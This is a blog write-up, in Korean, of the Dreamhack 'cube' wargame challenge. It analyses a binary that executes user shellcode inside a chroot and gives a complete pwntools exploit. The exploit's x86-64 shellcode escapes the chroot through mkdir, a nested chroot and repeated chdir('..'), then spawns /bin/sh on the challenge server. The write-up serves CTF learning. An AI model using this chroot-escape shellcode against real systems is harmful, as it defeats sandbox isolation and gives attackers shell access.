---
title: "cube writeup"
date: 2026-04-08 07:57:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, shellcode, chroot, dreamhack]
---

## Analysis

### checksec
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

### Source Code
```c
int sandbox()
{
  return chroot("/home/cube/cube_box");
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+0h] [rbp-10h]
  buf = mmap(nullptr, 0x400u, 7, 34, -1, 0);
  init();
  sandbox();
  printf("Give me shellcode: ");
  read(0, buf, 0x50u);
  ((void (*)(void))buf)();
  return 0;
}
```

## Vulnerability Analysis

`sandbox()`에서 `chroot("/home/cube/cube_box")`로 root dentry를 재설정한다. 이후 80바이트 쉘코드를 입력받아 실행시킨다.

딱히 seccomp filter가 걸려 있지 않으니 `execve("/bin/sh")`를 실행시키면 될 것이다. 그러나 `/home/cube/cube_box/bin/sh`는 존재하지 않을 것이다. 쉘을 실행시키기 위해서는 실제 루트 디렉토리로 다시 `chroot`해야 하므로, 우선 현재 디렉토리 상위로 탈출해야 할 것이다.

`chdir("..")`로 탈출하는 방법을 생각해볼 수 있는데, 기본적으로 프로세스의 root 상위로는 올라갈 수 없다. 이 제약은 리눅스 커널에서 현재 경로와 프로세스 루트의 `struct path` 멤버 변수인 `mnt`, `dentry` 주소가 동일한지를 확인함으로써 이루어진다.

그러나 루트 권한이 있으므로 하위 디렉토리를 생성해 그곳을 `chroot`로 설정하는 방법을 쓸 수 있다. 예를 들어 `a`라는 디렉토리를 만들고 `chroot`로 설정하면, cwd는 `/home/cube/cube_box`인데 프로세스 root는 `/home/cube/cube_box/a`가 된다. 이 상태에서 `chdir("..")`를 실행하면 현재 root가 이미 cwd의 하위에 위치하므로, 상위로 계속 올라가더라도 구조체 주소가 일치하지 않는다. 따라서 `chdir("..")`를 3번 반복하면 실제 루트에 도달할 수 있다.

다만 쉘코드의 크기가 80바이트로 제한된다는 점도 고려해야 한다. 이 제한을 맞추려면 Intel 명령어 크기를 신경 써서 작성해야 한다.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./cube")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 23112)
    return r

def main():
    r = conn()
    shellcode = """
        /* mkdir("a", -1) */
        push 0x61
        push rsp
        pop rdi
        push -1
        pop rsi
        push 83
        pop rax
        syscall

        /* chroot("a") */
        push rsp
        pop rdi
        push 161
        pop rax
        syscall

        /* chdir("..") x3 */
        push 0x2e2e
        push rsp
        pop rdi
        push 3
        pop rbx
    loop:
        push 80
        pop rax
        syscall
        dec rbx
        jnz loop

        /* chroot(".") */
        push 0x2e
        push rsp
        pop rdi
        xor rax, rax
        mov al, 161
        syscall

        /* execve("/bin/sh", 0, 0) */
        mov rax, 0x68732f6e69622f
        push rax
        push rsp
        pop rdi
        xor rsi, rsi
        xor rdx, rdx
        push 59
        pop rax
        syscall
    """
    r.sendafter(b": ", asm(shellcode))
    r.interactive()

if __name__ == "__main__":
    main()
```